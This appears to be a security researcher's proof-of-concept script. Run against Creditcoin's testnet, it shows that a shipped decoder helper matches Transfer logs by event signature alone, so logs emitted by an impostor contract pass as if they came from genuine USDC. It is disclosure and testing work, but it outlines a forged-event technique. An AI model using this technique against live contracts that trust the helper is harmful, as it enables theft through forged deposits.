/** Phase 0 probe 13 — demonstrate the impostor flaw in Creditcoin's OWN shipped helper,
 *  on chain, for free. getLogsByEventSignature is `pure`: we can call it with crafted logs. */
import { JsonRpcProvider, Contract, id, zeroPadValue, AbiCoder } from 'ethers';
import decoderAbi from '@gluwa/usc-sdk/dist/utils/evmV1DecoderAbi.json' with { type: 'json' };
const CC3 = new JsonRpcProvider('https://rpc.cc3-testnet.creditcoin.network');
const DEC = '0x731c345d79Fb8BbDC541f9DF3b6317585F849F9f';

const REAL_USDC  = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // genuine USDC
const IMPOSTOR   = '0xD2973C898c3B028ad71763FD7444E537148e77d0'; // anyone at all
const TRANSFER   = id('Transfer(address,address,uint256)');

async function main() {
  const dec = new Contract(DEC, decoderAbi as any, CC3);
  const amount = AbiCoder.defaultAbiCoder().encode(['uint256'], [1_000_000_000_000n]);
  const topics = [TRANSFER, zeroPadValue(IMPOSTOR, 32), zeroPadValue(REAL_USDC, 32)];

  const logs = [
    { address_: REAL_USDC, topics, data: amount },  // the genuine emitter
    { address_: IMPOSTOR,  topics, data: amount },  // an impostor, same signature
  ];

  console.log('Calling EvmV1Decoder.getLogsByEventSignature on CC3 (pure, free) with 2 logs:');
  console.log(`  [0] emitter ${REAL_USDC}  (genuine USDC)`);
  console.log(`  [1] emitter ${IMPOSTOR}  (impostor — ANY address)`);
  console.log(`  filtering on topic0 = Transfer(address,address,uint256) = ${TRANSFER}\n`);

  const out = await dec['getLogsByEventSignature((address,bytes32[],bytes)[],bytes32)'](
    logs.map(l => [l.address_, l.topics, l.data]), TRANSFER);

  console.log(`matched ${out.length} of 2 logs:`);
  for (const l of out) console.log(`  MATCH emitter=${l[0]}  amount=${BigInt(l[2]).toString()}`);
  console.log(`\nThe helper returns BOTH. It filters on topics[0] only and never reads`);
  console.log(`logs[i].address_ (EvmV1Decoder.sol:133). An ASC that trusts this helper`);
  console.log(`accepts a forged event from any contract that emits the right signature.`);

  // and the mirror image: a genuine emitter with a DIFFERENT signature is dropped
  const other = id('Approval(address,address,uint256)');
  const out2 = await dec['getLogsByEventSignature((address,bytes32[],bytes)[],bytes32)'](
    logs.map(l => [l.address_, l.topics, l.data]), other);
  console.log(`\ncontrol: filtering the same logs on Approval -> ${out2.length} matches (signature is the ONLY criterion)`);
}
main().catch(e => console.error('FATAL', e.message ?? e));
